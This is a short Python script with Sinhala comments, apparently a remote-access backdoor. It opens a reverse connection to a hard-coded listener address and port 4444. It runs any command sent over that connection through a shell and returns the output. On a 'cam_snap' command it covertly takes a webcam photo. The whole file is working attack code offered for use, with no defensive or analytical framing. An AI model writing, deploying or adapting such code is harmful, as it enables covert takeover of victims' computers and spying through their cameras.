import socket
import subprocess
import os
import cv2 # Camera සඳහා
import platform

# Configuration
LHOST = '192.168.8.120' # ඔයාගේ IP එක
LPORT = 4444

def x4x_payload():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((LHOST, LPORT))
    except:
        return

    while True:
        data = s.recv(1024).decode()
        
        if data == "exit":
            break
        
        # කැමරා විශේෂාංගය
        elif data == "cam_snap":
            try:
                cam = cv2.VideoCapture(0)
                ret, frame = cam.read()
                if ret:
                    cv2.imwrite("snap.jpg", frame)
                    s.send(b"[+] Photo Captured Successfully")
                cam.release()
            except:
                s.send(b"[-] Camera Access Failed")

        # Command execution
        else:
            try:
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                s.send(result if result else b"Command executed.")
            except Exception as e:
                s.send(str(e).encode())

    s.close()

if __name__ == "__main__":
    x4x_payload()

